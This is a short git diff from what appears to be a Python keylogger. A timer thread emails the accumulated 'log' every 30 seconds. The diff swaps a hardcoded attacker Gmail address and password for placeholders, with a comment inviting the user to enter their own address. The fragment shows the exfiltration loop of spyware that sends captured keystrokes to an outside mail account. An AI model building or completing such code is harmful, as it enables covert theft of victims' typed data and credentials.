@@ -25,7 +25,7 @@ def send_email(email, password, message):
 
 def thread_function():
     global log
-    send_email("hackerxplotcompax@gmail.com", "hackerhacker123456", log)
+    send_email("**********", "*********", log)  ##It is up to you (Enter your mail address)
     log = " "
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
